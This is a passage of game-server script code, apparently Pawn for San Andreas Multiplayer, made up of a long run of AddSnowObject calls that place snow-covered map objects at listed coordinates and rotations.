	AddSnowObject(5472, 2117.29687, -1541.57812, 23.53906, 0.00000, 0.00000, 270.00000);
	AddSnowObject(5391, 2148.80468, -1627.12500, 13.42968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5519, 2159.81250, -1595.92187, 12.89062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5438, 2222.67187, -1462.91406, 22.78906, 0.00000, 0.00000, 270.00000);
	AddSnowObject(17509, 2511.75781, -1544.31250, 18.51562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17505, 2339.78906, -1583.99218, 12.76562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17877, 2374.30468, -1640.43750, 12.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5429, 2244.69531, -1518.75000, 22.23437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17625, 2315.35937, -1444.20312, 22.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17563, 2307.92187, -1434.03906, 21.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17637, 2391.17968, -1414.32812, 22.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17636, 2411.16406, -1402.88281, 28.01562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17645, 2481.21875, -1350.49218, 27.77343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17644, 2511.76562, -1349.52343, 30.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17634, 2411.02343, -1301.75000, 25.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17642, 2411.08593, -1235.32812, 27.80468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17635, 2411.02343, -1352.10156, 23.70312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17630, 2371.07812, -1216.36718, 24.71093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17628, 2371.08593, -1320.45312, 22.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17633, 2337.21875, -1228.52343, 24.74218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17976, 2414.39843, -1362.20312, 32.60156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17643, 2451.01562, -1230.28906, 29.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17646, 2511.00000, -1256.60156, 33.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17641, 2454.60156, -1350.46093, 22.82812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17627, 2347.67187, -1384.31250, 22.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17545, 2337.17968, -1342.62500, 23.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17626, 2303.43750, -1338.03906, 22.98437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5674, 2286.37500, -1371.27343, 22.95312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5428, 2252.00000, -1434.14062, 23.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5494, 2263.21093, -1368.70312, 22.92968, 0.00000, 0.00000, 270.00000);
	AddSnowObject(5426, 2218.89062, -1342.55468, 25.24218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5437, 2155.00000, -1382.00000, 23.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5427, 2170.97656, -1461.12500, 25.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5496, 2120.00000, -1440.00000, 23.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5497, 2060.19531, -1463.40625, 18.94531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5402, 2049.86718, -1400.89062, 20.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5495, 2066.00000, -1358.00000, 23.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5425, 2116.32031, -1342.85937, 26.73437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5492, 2168.21093, -1300.80468, 22.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5477, 2287.09375, -1217.65625, 24.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17632, 2307.52343, -1225.10156, 23.80468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5490, 2269.78125, -1224.53125, 24.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5491, 2171.39062, -1220.82031, 22.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5424, 2218.89062, -1260.81250, 24.28906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5493, 2169.97656, -1260.46093, 22.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5482, 2172.57031, -1171.20312, 23.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5459, 2123.93750, -1159.00000, 24.16406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5406, 2223.26562, -1202.18750, 27.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5650, 2213.50000, -1124.90625, 24.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5413, 2222.99218, -1162.60156, 30.03906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5423, 2121.10156, -1260.87500, 26.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5435, 2069.36718, -1260.99218, 22.89843, 0.00000, 0.00000, 90.00000);
	AddSnowObject(5434, 1946.82812, -1260.90625, 17.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5499, 1944.00000, -1341.00000, 18.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5487, 1972.60937, -1198.31250, 23.97656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5458, 1995.01562, -1198.35156, 21.10937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5483, 2069.29687, -1149.20312, 22.94531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5432, 2110.09375, -1098.80468, 23.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5485, 1950.59375, -1135.88281, 24.02343, 0.00000, 0.00000, 180.00000);
	AddSnowObject(5486, 2005.50000, -1081.30468, 24.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5443, 2019.40625, -1107.13281, 24.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5481, 2023.25781, -1034.48437, 29.12500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5445, 2105.96093, -1038.55468, 40.41406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5444, 2143.05468, -1048.40625, 48.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5453, 2179.78906, -1082.48437, 42.72656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5446, 2086.29687, -1077.07812, 29.05468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5484, 2190.58593, -1063.07031, 45.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5452, 2258.35937, -1099.41406, 39.99218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5456, 2185.09375, -1013.21093, 59.19531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5642, 2229.60937, -1063.46875, 46.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5643, 2202.56250, -1041.62500, 58.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13706, 2372.03125, -1056.34375, 57.03906, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13823, 2284.00781, -929.46875, 88.18750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5451, 2256.03125, -1019.92187, 59.38281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13795, 2422.11718, -1093.34375, 48.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17631, 2336.93750, -1153.14062, 26.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17669, 2378.03125, -1110.17187, 33.61718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17906, 2440.30468, -1120.25000, 43.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17670, 2463.75000, -1151.64843, 34.96875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17647, 2420.95312, -1179.13281, 31.01562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17678, 2506.88281, -1167.06250, 46.24218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17648, 2511.03906, -1184.53906, 48.20312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17892, 2511.02343, -1220.26562, 42.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17893, 2553.97656, -1205.13281, 60.65625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17894, 2524.44531, -1205.61718, 56.40625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17651, 2636.89062, -1184.08593, 64.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17650, 2570.89843, -1230.30468, 52.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17652, 2646.79687, -1257.00000, 51.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17649, 2571.00000, -1350.40625, 33.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17679, 2540.82812, -1350.58593, 40.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17681, 2682.64843, -1456.39843, 29.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17653, 2642.78906, -1350.25781, 39.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17666, 2642.67187, -1217.78125, 58.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17658, 2730.13281, -1445.92187, 32.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17608, 2806.30468, -1488.45312, 19.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17556, 2804.71093, -1451.60937, 19.54687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17561, 2769.53125, -1446.67187, 22.06250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17683, 2866.69531, -1355.90625, 15.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17674, 2903.42968, -1336.88281, 9.97656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17676, 2928.05468, -1298.13281, 8.16406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17660, 2825.99218, -1386.36718, 15.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17685, 2810.67187, -1263.75000, 39.12500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17589, 2801.78125, -1392.64062, 20.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17661, 2796.89062, -1323.23437, 32.82812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17673, 2882.54687, -1146.64062, 10.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17684, 2847.09375, -1148.80468, 16.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17659, 2729.00000, -1330.70312, 47.29687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17663, 2730.19531, -1220.90625, 63.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17662, 2777.29687, -1259.00000, 52.00000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17664, 2685.25781, -1220.95312, 59.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17671, 2633.64843, -1152.68750, 47.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17696, 2690.39062, -1154.14062, 56.71093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17677, 2587.65625, -1101.25781, 56.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17849, 2642.73437, -1086.32031, 66.02343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17667, 2642.71875, -1164.50000, 59.16406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17693, 2730.23437, -1117.64843, 64.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17691, 2778.79687, -1099.79687, 41.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17672, 2789.42187, -1144.94531, 29.95312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13810, 2948.41406, -951.76562, -28.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13708, 2778.64843, -930.35156, 39.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13709, 2856.43750, -930.17968, 16.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13809, 2734.87500, -917.96093, 47.82031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13497, 2870.02343, -662.57812, 26.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13121, 2870.02343, -662.57812, 26.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12877, 2870.77343, -677.79687, 10.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13120, 2629.58593, -662.28906, 89.49218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13156, 2379.60156, -670.41406, 112.02343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13123, 2631.27343, -415.71875, 54.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13134, 2372.07031, -407.32812, 73.57031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13710, 2523.76562, -915.31250, 85.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13707, 2563.92187, -1047.17187, 68.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17692, 2681.78125, -1078.75000, 68.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17694, 2704.28906, -1095.78906, 62.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17668, 2506.70312, -1079.83593, 54.94531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13122, 2862.23437, -413.64062, -4.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12878, 2807.10937, -480.72656, 16.26562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12974, 2793.53125, -447.35937, 18.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12876, 2815.46875, -278.23437, 10.93750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12879, 2732.03906, -231.38281, 29.75781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13824, 2039.82031, -904.82031, 79.06250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13157, 2148.91406, -662.00000, 90.57031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13158, 1941.59375, -686.10156, 75.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13825, 1826.08593, -882.76562, 75.32031, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5433, 2044.59375, -1007.20312, 38.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5448, 2068.20312, -965.95312, 47.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5656, 2046.64843, -1009.96875, 40.89062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4695, 1898.47656, -1016.67968, 29.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5431, 1914.17968, -1073.31250, 23.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5668, 1928.90625, -1026.75781, 28.71875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5457, 1923.60937, -1088.34375, 24.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5640, 1914.03125, -1198.32812, 19.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5488, 1852.26562, -1196.06250, 20.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4700, 1807.28125, -1049.87500, 23.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4604, 1757.00781, -1127.25781, 23.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4658, 1810.93750, -1001.45312, 34.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4692, 1702.95312, -1031.42968, 39.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4701, 1722.28906, -1043.25000, 23.01562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4595, 1634.42968, -1115.53125, 23.03125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4702, 1647.33593, -1033.16406, 22.99218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4666, 1614.67968, -1024.67968, 42.78125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4653, 1661.97656, -910.81250, 46.05468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4664, 1643.16406, -1128.23437, 41.56250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4662, 1624.82031, -1229.85937, 34.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4656, 1693.95312, -766.04687, 50.00781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13826, 1805.02343, -699.98437, 69.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13672, 1700.89062, -556.53906, 38.35937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13723, 1496.91406, -790.91406, 48.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13821, 1530.92187, -532.64062, 62.98437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13751, 1650.02343, -559.67187, 42.35156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13820, 1701.62500, -489.19531, 59.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13502, 1935.17968, -526.87500, 51.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13719, 1437.55468, -669.28906, 86.81250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13673, 1284.30468, -677.42187, 81.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13674, 1411.90625, -562.96875, 67.58593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13818, 1317.85937, -474.10156, 52.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13323, 1245.20312, -430.53906, 22.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13237, 1148.69531, -528.16406, 57.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13752, 1210.70312, -625.61718, 78.71093, 0.00000, 0.00000, 10.44999);
	AddSnowObject(13720, 1192.34375, -669.16406, 52.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4660, 1507.78125, -966.94531, 33.83593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4703, 1569.92187, -1041.07812, 22.97656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13882, 1376.50000, -788.78906, 67.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(4694, 1425.03906, -947.82812, 34.28125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5803, 1376.42968, -912.18750, 36.17968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13756, 1349.29687, -809.14062, 68.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13801, 1341.02343, -839.93750, 58.13281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13757, 1250.80468, -833.01562, 63.37500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5845, 1323.66406, -884.63281, 36.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5851, 1323.66406, -884.63281, 36.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(5744, 1268.44531, -935.32031, 37.70312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13715, 1041.32031, -707.45312, 90.02343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13718, 1063.58593, -626.98437, 112.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13528, 1138.66406, -311.89062, 38.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13212, 1138.66406, -311.89062, 38.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13324, 979.50781, -500.17968, 33.12500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13213, 896.94531, -285.84375, 22.55468, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13214, 871.25781, -411.43750, 38.10156, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13236, 953.02343, -569.69531, 68.14062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13211, 594.83593, -299.83593, 6.28125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13129, 786.71093, -539.52343, 15.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12999, 681.71093, -574.88281, 15.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3316, 769.21875, -558.86718, 18.67187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3315, 750.86718, -594.17968, 16.32812, 0.00000, 0.00000, 270.00000);
	AddSnowObject(3317, 744.21875, -558.86718, 18.67187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3314, 740.15625, -500.96875, 16.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3317, 769.20312, -501.39843, 18.67187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3353, 798.24218, -500.96875, 16.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(3314, 815.15625, -500.96875, 16.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12998, 811.71875, -580.96875, 15.25781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12981, 857.21093, -609.96875, 17.41406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13531, 797.70312, -707.14062, 64.24218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13235, 797.70312, -707.14062, 64.24218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13845, 667.54687, -853.20312, 52.79687, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13704, 653.58593, -841.35156, 39.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13730, 767.57031, -927.32812, 48.36718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13702, 696.50781, -849.16406, 54.88281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13726, 809.36718, -778.78125, 80.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12976, 681.47656, -459.00000, 15.53125, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13001, 701.06250, -507.64062, 15.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13127, 631.71093, -507.64062, 15.25000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13000, 563.56250, -438.88281, 36.09375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12989, 536.89062, -578.04687, 32.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13128, 640.57031, -660.17968, 12.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12855, 622.94531, -577.06250, 21.81250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12971, 548.76562, -626.98437, 26.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13370, 543.13281, -807.58593, 52.84375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13371, 422.06250, -782.47656, 42.61718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13021, 387.11718, -941.69531, 51.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12864, 183.82812, -697.42968, 24.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13019, 141.58593, -858.93750, 5.67968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12973, 421.21093, -570.23437, 37.92187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13020, 317.19531, -869.16406, 33.00781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13342, 133.44531, -655.82812, 14.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12970, 310.78906, -591.55468, 33.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13017, 155.79687, -1140.15625, 6.23437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13683, 339.72656, -1086.42968, 73.91406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13871, 415.52343, -1080.00000, 76.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13789, 191.51562, -1207.74218, 52.64843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13692, 252.23437, -1211.92968, 64.96093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13685, 428.91406, -1103.67187, 77.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13735, 313.93750, -1203.23437, 74.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13678, 223.12500, -1150.96875, 64.75000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13736, 239.78906, -1283.89843, 61.64062, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13733, 329.53906, -1237.81250, 62.83593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13679, 269.46875, -1271.35937, 70.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13738, 319.97656, -1289.57031, 52.48437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13734, 366.11718, -1226.23437, 58.15625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13732, 449.83593, -1233.48437, 33.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13684, 495.02343, -1153.19531, 62.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13742, 508.64062, -1244.42968, 40.16406, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6509, 529.00781, -1268.35937, 15.51562, 0.00000, 0.00000, 39.00000);
	AddSnowObject(6327, 377.28909, -1362.66406, 13.58593, 0.00000, 0.00000, 30.10199);
	AddSnowObject(6330, 525.21093, -1443.21875, 14.47656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13741, 332.99218, -1331.38281, 32.97656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6356, 381.28125, -1323.17187, 24.49218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6328, 294.97656, -1366.74218, 18.92968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13691, 258.95309, -1366.19531, 62.80468, 0.00000, 0.00000, 38.38000);
	AddSnowObject(13740, 179.30468, -1448.42968, 28.01562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6326, 207.59375, -1484.50781, 11.90625, 0.00000, 0.00000, 207.04595);
	AddSnowObject(6497, 227.78906, -1423.03125, 18.60937, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13737, 252.86718, -1288.48437, 64.32812, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13739, 216.09375, -1361.97656, 49.17187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13690, 135.64062, -1455.68750, 25.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13675, 116.01563, -1393.33593, 24.90625, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6325, 128.12500, -1551.03125, 8.20312, 0.00000, 0.00000, 352.20999);
	AddSnowObject(17281, -42.50780, -1476.89062, 4.31250, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17121, -65.05467, -1572.94531, -3.89843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17118, -52.24219, -1395.50781, 4.52343, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17186, -39.32030, -1566.71875, 1.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17279, -111.00781, -1362.33593, 5.23437, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13676, 78.41406, -1270.49218, 13.69531, 0.00000, 0.00000, 0.00000);
	AddSnowObject(13677, 92.21875, -1291.65625, 14.11718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17301, -49.39062, -1140.86718, 5.20312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17297, -28.64842, -1020.34375, 16.39843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6292, 137.72656, -1026.68750, 24.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17117, 5.04687, -1000.33593, 17.08593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17305, -153.19531, -971.96093, 34.26562, 0.00000, 0.00000, 0.00000);
	AddSnowObject(12851, -51.97655, -842.67187, 19.74218, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17115, -283.96875, -960.07031, 33.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17302, -160.82812, -1100.76562, 6.42968, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17296, -178.11718, -1049.76562, 14.33593, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17303, -114.95313, -1179.69531, 3.14843, 0.00000, 0.00000, 0.00000);
	AddSnowObject(17119, -226.96093, -1253.90625, 7.86718, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6428, 245.19531, -1736.70312, 3.63281, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6315, 205.46093, -1656.82031, 8.96875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6416, 95.64842, -1593.14843, -19.21093, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6314, 127.64842, -1659.70312, 7.42187, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6293, 125.69531, -1768.54687, -10.59375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6280, 260.02343, -1839.91406, -1.45312, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6417, 156.53906, -1908.78125, -13.68750, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6427, 293.21875, -1691.21875, 7.84375, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6448, 335.30468, -1711.90625, 25.62500, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6449, 387.76562, -1823.63281, 12.50781, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6311, 400.69531, -1755.70312, 6.50000, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6297, 432.81250, -1856.28906, 1.22656, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6450, 379.72656, -1945.95312, -1.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6300, 379.53906, -2050.86718, -1.21875, 0.00000, 0.00000, 0.00000);
	AddSnowObject(6310, 437.89843, -1715.10156, 8.59375, 0.00000, 0.00000, 0.00000);
